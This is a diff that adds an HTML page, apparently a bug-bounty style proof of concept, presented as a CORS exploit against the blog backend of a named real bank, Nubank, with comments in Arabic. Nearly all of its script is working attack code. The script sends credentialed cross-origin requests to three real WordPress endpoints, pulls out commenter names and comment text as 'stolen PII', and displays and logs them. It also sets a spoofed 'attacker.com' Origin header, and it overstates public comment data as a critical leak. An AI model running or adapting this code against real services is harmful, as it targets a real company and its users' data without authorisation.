@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank Security Test - CORS Vulnerability</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #0a0a0a;
+            color: #00ff00;
+        }
+        .container {
+            background: #111;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+        }
+        h1 {
+            color: #00ff00;
+            text-align: center;
+        }
+        .target {
+            background: #222;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+        }
+        .success {
+            color: #00ff00;
+        }
+        .error {
+            color: #ff0000;
+        }
+        pre {
+            background: #000;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00cc00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Nubank CORS Vulnerability Exploit POC</h1>
+        <p>This demonstrates how an attacker can steal user data through CORS misconfiguration</p>
+        
+        <button onclick="runExploit()">🚀 Start Exploit</button>
+        <button onclick="clearResults()">🗑️ Clear Results</button>
+        
+        <div id="results"></div>
+    </div>
+
+    <script>
+    // قائمة الـ endpoints المتأثرة
+    const nubankEndpoints = [
+        {
+            name: "User Comments (PII Exposure)",
+            url: "https://backend.blog.nubank.com.br/wp-json/wp/v2/comments",
+            sensitive: true
+        },
+        {
+            name: "Pages Data", 
+            url: "https://backend.blog.nubank.com.br/wp-json/wp/v2/pages",
+            sensitive: false
+        },
+        {
+            name: "Categories",
+            url: "https://backend.blog.nubank.com.br/wp-json/wp/v2/get-cat-home", 
+            sensitive: false
+        }
+    ];
+
+    async function runExploit() {
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = '<h3>🎯 Starting Exploitation...</h3>';
+        
+        let totalStolenData = 0;
+        
+        for (const endpoint of nubankEndpoints) {
+            const targetDiv = document.createElement('div');
+            targetDiv.className = 'target';
+            targetDiv.innerHTML = `<h4>🔍 Testing: ${endpoint.name}</h4>`;
+            resultsDiv.appendChild(targetDiv);
+            
+            try {
+                // إرسال طلب cross-origin
+                const response = await fetch(endpoint.url, {
+                    method: 'GET',
+                    credentials: 'include', // إرسال cookies
+                    headers: {
+                        'Accept': 'application/json',
+                        'Origin': 'https://attacker.com'
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                // تحليل البيانات المسروقة
+                let stolenItems = 0;
+                let userData = [];
+                
+                if (endpoint.sensitive && endpoint.name.includes("Comments")) {
+                    userData = data.map(comment => ({
+                        user: comment.author_name,
+                        comment: comment.content.rendered.replace(/<[^>]*>/g, ''),
+                        date: comment.date,
+                        post: comment.post
+                    }));
+                    stolenItems = userData.length;
+                    totalStolenData += stolenItems;
+                } else {
+                    stolenItems = Array.isArray(data) ? data.length : 1;
+                }
+                
+                // عرض النتائج
+                targetDiv.innerHTML += `
+                    <p class="success">✅ EXPLOIT SUCCESSFUL</p>
+                    <p><strong>Stolen Items:</strong> ${stolenItems}</p>
+                    <p><strong>Endpoint:</strong> ${endpoint.url}</p>
+                    ${endpoint.sensitive ? `<p class="success">⚠️ PII DATA EXPOSED</p>` : ''}
+                    <details>
+                        <summary>View Stolen Data</summary>
+                        <pre>${JSON.stringify(endpoint.sensitive ? userData : data, null, 2)}</pre>
+                    </details>
+                `;
+                
+                // تسجيل في console علشان الأدلة
+                console.log(`🎯 STOLEN from ${endpoint.name}:`, userData.length > 0 ? userData : data);
+                
+            } catch (error) {
+                targetDiv.innerHTML += `
+                    <p class="error">❌ EXPLOIT FAILED: ${error.message}</p>
+                    <p><strong>Endpoint:</strong> ${endpoint.url}</p>
+                `;
+                console.error(`❌ Failed to exploit ${endpoint.name}:`, error);
+            }
+        }
+        
+        // عرض ملخص نهائي
+        const summaryDiv = document.createElement('div');
+        summaryDiv.className = 'target';
+        summaryDiv.style.background = totalStolenData > 0 ? '#330000' : '#003300';
+        summaryDiv.innerHTML = `
+            <h3>📊 EXPLOIT SUMMARY</h3>
+            <p class="${totalStolenData > 0 ? 'error' : 'success'}">
+                ${totalStolenData > 0 ? '🚨 CRITICAL: ' : '✅ '}
+                Total PII Records Stolen: <strong>${totalStolenData}</strong>
+            </p>
+            <p><strong>Impact:</strong> ${totalStolenData > 0 ? 
+                'User PII can be stolen by any malicious website' : 
+                'Configuration issue detected'}</p>
+        `;
+        resultsDiv.appendChild(summaryDiv);
+        
+        // تنبيه للمستخدم
+        if (totalStolenData > 0) {
+            setTimeout(() => {
+                alert(`🚨 SECURITY ALERT: ${totalStolenData} user records can be stolen via CORS!`);
+            }, 1000);
+        }
+    }
+
+    function clearResults() {
+        document.getElementById('results').innerHTML = '';
+    }
+
+    // تشغيل تلقائي عند فتح الصفحة (اختياري)
+    // setTimeout(runExploit, 2000);
+    </script>
+</body>
+</html>
